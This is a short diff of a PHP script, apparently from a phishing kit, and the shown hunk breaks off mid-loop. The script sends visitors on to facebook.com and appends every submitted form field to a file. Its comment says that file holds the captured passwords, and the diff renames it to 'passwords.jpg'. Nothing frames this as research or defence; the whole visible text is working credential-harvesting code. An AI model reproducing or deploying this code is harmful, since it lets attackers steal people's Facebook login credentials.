@@ -1,6 +1,6 @@
 <?php
 header ('Location: https://facebook.com/me'); //Redirect user.
-$handle = fopen("notinawordlist1337.jpg", "a"); //You can rename the file you want to save the passwords.
+$handle = fopen("passwords.jpg", "a"); //You can rename the file you want to save the passwords.
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
